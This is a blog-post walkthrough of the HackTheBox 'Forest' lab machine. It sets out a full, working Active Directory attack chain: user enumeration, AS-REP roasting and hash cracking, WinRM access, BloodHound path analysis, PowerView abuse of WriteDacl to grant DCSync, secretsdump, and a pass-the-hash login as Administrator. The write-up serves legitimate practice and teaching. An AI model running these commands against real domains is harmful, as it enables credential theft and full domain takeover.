---
layout: post
title: HackTheBox Forest Walkthrough
image: /assets/img/blog/forest.jpg
accent_image: 
  background: url('/assets/img/blog/forest.jpg') center/cover
  overlay: false
accent_color: '#ccc'
theme_color: '#ccc'
description: >
  In this post you will find a step by step resolution walkthrough of the Forest machine on HTB platform 2023.
invert_sidebar: true
---

# HackTheBox Forest Walkthrough

Forest in an easy/medium difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. 
The DC allows anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with 
Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account 
Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain 
DCSync privileges on the domain and dump the NTLM hashes.

* toc
{:toc}

## Enumeration
To enumerate the machine a first nmap scan to discover the open TCP ports on the machine was performed. Also when the open ports 
were retrieved a more in depth scan including fingerprinting was issued. With the following commands:
~~~bash
# First nmap scan
sudo nmap -sS -p- --min-rate 500 --open 10.10.10.161 -Pn -n -oG recon_10.10.10.161
# Exhaustive scan of the open ports
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 -sCV 10.10.10.161 -Pn -n -oN openports_10.10.10.161
~~~

The results obtained by this scans showed some interesting open ports:
![800x400](/assets/img/blog/nmapforest.png "Nmap scan")
* Port 53 is open and is hosting a DNS service over TCP – version: Simple DNS Plus
* Port 88 is open and is hosting the kerberos service.
* Ports 135 / 139 / 445 are open and are hosting the RPC / NetBIOS / SMB share services respectively.
* Ports 389 / 3268 and 636 / 3269 are open and hosting the LDAP/S services respectively
* Port 464 is open are hosting a Kerberos password change service, typically seen on DCs and generally not of much interest.
* Ports 593 is open and hosting RPC services over HTTP.
* Ports 5985 and 47001 are hosting the WinRM service, which will be good if credentials are found.
* Port 9389 is hosting the .NET Message Framing service.
* Port 47001 is open, which is commonly associated with WinRM – Microsoft HTTPAPI httpd 2.0 — Check in browser to make sure its not a web server.
* Ports 49xxx are hosting the high port RPC services, typically not of much interest.

From the nmap scan we can see this is a `Domain Controller` with a hostname of `FOREST` and that this is the DC for the domain `htb.local`.

After enumerating many ports unsuccessfully, we found that via port 135 anonymous authentication was available and therefore some enumeration was valid. The `domain users` were enumerated for further attacks:
~~~bash
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
~~~
![800x400](/assets/img/blog/forest/rcpenum.png "RPC enumeration")

## AS-REP Roasting
With the obtained users list we checked if any of them had the `UF_DONT_REQUIRE_PREAUTH` flag set executing the following impacket python script:
~~~bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile content/users
~~~
![800x400](/assets/img/blog/forest/asrep.png "AS-REP Roast attack")

Amazing! a service account hash was dumped!

As this hash cannot be used to perform attacks as `pass-the-hash` we tried to crack it to obtain the plain-text password. After storing the obtained hash on a file named `hashes.asreproast` we cracked the pass using `Hashcat` a GPU based software used to crack password hashes.
~~~bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
~~~
![800x400](/assets/img/blog/forest/hashcrack.png "Cracking AS-REP hash")
Success :) A match seems to have been found! The obtained credentials are `svc-alfresco:s3rvice`
## Getting a foothold
With the obtained credentials we checked if they were valid on the domain with crackmapexec:
~~~bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
~~~
![800x400](/assets/img/blog/forest/smbcme.png "Validating credentials with crackmapexec")

The output shows the credentials are valid on the domain, great! But as the user seems to be a low privileged user we still need an attack vector to get a foothold.

Checking again if the user can access the machine via `Win-RM` with CME, we got a result displaying a `PWNED!` message, meaning that the user is on the `remote-management-users` group and therefore we can connect to the machine remotely.
~~~bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
~~~
![800x400](/assets/img/blog/forest/winrmcme.png "Crackmapexec for winrm")
The easiest way to access the machine is via `evil-winrm` as:
~~~bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
~~~
![800x400](/assets/img/blog/forest/evilwinrm.png "Evil-winrm connection")
Great we are inside! 😈

At this point we got the flag located at `C:\Users\svc-alfresco\Desktop\user.txt`
## Post-Exploitation enumeration
As this machine is `domain-joined` 2 types of enumeration can be performed, machine and domain enumeration. The first one in this case didn't gave back any interesting results, so our efforts centered on domain enum.
> 90% of the time the privilege escalation technique used in a domain will be domain-based.
{:.lead}
To enumerate the domain we used a ps script named `SharpHound` that gathers domain information and condenses the results in a zip file we can later inspect. To download and execute the script:
~~~bash
upload /home/kali/hackthebox/forest/content/../../../oscp/SharpHound.ps1 .
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Documents\ -OutputPrefix "forestEnum"
~~~
![800x400](/assets/img/blog/forest/sh.png "Download and execution of sharphound")
Once we got our results and transfered the data to our machine, we started Neo4j DB and bloodhound to analyse the results. To start both services:
~~~bash
sudo neo4j start
bloodhound
~~~
![800x400](/assets/img/blog/forest/neo4j.png "Neo4j+bloodhound start")

Looking for the paths, we start from Shortest Path on the Owned Principal. It shows that svc-alfresco is a member of `Service Accounts`, 
Service Accounts is a member of `Privileged IT Accounts`, which is a member of `Account Operators`. 
Account Operators is a member of `Exchage Windows Permissions`. Exchange Windows Permissions has `WriteDacl permission` on HTB.LOCAL.
![800x400](/assets/img/blog/forest/bh2.png "Path enumeration")
With this information we can abuse `WriteDacl` to grant us `DCSync` rights on the domain.
## Privilege Escalation
To abuse the previously gathered info, we created a user and added him to the `Exchange Windows Permissions` group:
~~~bash
net user pwned pwned123 /add /domain
net group "Exchange Windows Permissions" /add pwned
~~~
![800x400](/assets/img/blog/forest/adduser.png "UserAdd")
Then with the help of PowerView we abused WriteDacl. After uploading the script, we created a credential object for our password and credential. 
Then running the last command granted DCSync rights on our account.
~~~bash
upload /home/kali/hackthebox/forest/content/../../../oscp/PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
$pass = convertto-securestring 'pwned123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('HTB\pwned', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwned -Rights DCSync
~~~
![800x400](/assets/img/blog/forest/powerview.png "Privesc")
Once we set the apropiate rights we managet to dump the secrets of the DC.
~~~bash
secretsdump.py htb.local/pwned:'pwned123'@10.10.10.161
~~~
![800x400](/assets/img/blog/forest/secrets.png "Secrets dump")
After dumping all the hashes we can connect to the machine with the `Administrator` account performing a `pass-the-hash` attack as:
~~~bash
evil-winrm -i 10.10.10.161 -u Administrator -H <hash>
~~~
![800x400](/assets/img/blog/forest/eviladmin.png "evil-winrm admin connection")

At this point we successfully pwned the machine and we have got complete control of the system 💀💀💀

Last but not least we retrieved the flag located at `C:\Users\Administrator\Desktop\root.txt`
